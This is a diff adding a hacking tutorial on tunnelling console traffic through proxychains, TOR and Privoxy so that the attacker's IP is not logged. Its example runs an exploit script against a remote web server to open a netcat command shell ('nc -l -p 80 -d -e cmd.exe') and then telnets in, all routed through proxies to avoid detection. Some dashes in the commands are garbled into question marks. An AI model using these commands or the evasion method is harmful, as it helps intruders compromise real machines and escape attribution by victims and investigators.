@@ -1,0 +1,75 @@
+Way to Proxify the console data
+
+
+This tutorial is about how to tunnel your all "console" data, e.g. telnet, netcat or exploits etc, through proxies so that your IP would not be logged there ;)
+
+Few free utilities are floating on internet for this purpose. We'll use "proxychains" available on sourceforge.net. (http://proxychains.sourceforge.net/)
+It's available for *nix platforms only ?
+
+Installation of proxychains on *nix platform (BackTrack3 in my case)
+
+Downloaded file: proxychains-3.1.tar.gz
+Untar the package:
+
+# tar ?xvzf proxychains-3.1.tar.gz
+
+It will create a directory named "proxychains-3.1
+
+Change the directory
+# cd proxychains-3.1
+
+Configure and install it
+# ./configure
+# make
+# make install
+
+(It's always advisable to read "README" and "INSTALL" text files residing in the same directory before configuring and installing Linux applications)
+
+Hope no error occurs while installing (otherwise Google is your friend)
+
+Now /etc/proxychains.conf is the file where you can put your proxies to be used in different manners. But that's always a frustrating job as proxies dies soon and hence your frequent interception will be required. So it's better to rely on TOR proxy network for this. Proxychains has option for using TOR network for tunneling the data.
+
+For that you don't need to edit configuration file (proxychains.conf) in any way.
+
+
+
+Example:
+Suppose you have to run an exploit at your end which will in turn run netcat installed on remote machine (by you or some other intruder). After that of course you will telnet to the remote machine to get remote console.
+
+(Exploit by Roelof Temming, unitoolz)
+# ./unicodeexecute3.pl <remote_ip>:80 'c:\nc.exe ?l ?p 80 ?d ?e cmd.exe'
+# telnet <remote_ip> 80
+
+
+So in normal situation you will establish connection twice with remote machine ( IP logged !!!)
+Here proxychains will help us to hide our identity.
+
+# proxychains ./unicodeexecute3.pl <remote_ip>:80 'c:\nc.exe ?l ?p 80 ?d ?e cmd.exe'
+# proxychains telnet <remote_ip> 80
+
+................and you are safe now ?
+
+But how would you assure that your IP has been changed? Or better to say its been spoofed?
+Here comes the usage of one more Linux utility: "lynx". It's a kinda console browser.
+
+# lynx www.google.com
+
+and it'll open up google on your console (obviously without graphics)
+
+Edit the /etc/proxychains.conf file and comment the following line:
+# Proxy DNS requests - no leak for DNS data
+proxy_dns (comment out this using "#")
+
+Now open console and type
+# proxychains lynx www.whatismyip.com or
+# proxychains lynx www.findmyip.com
+
+voila!!! your IP has been spoofed.
+
+Obviously you need to configure TOR and Privoxy on you Linux machine before proxychains use them (that's not a piece of cake ? )
+
+TOR and privoxy are already installed on your BT3 machine but you need to configure privoxy properly in order to use them successfully.
+
+Happy Hacking !!!
+
+Frozen sm0ke
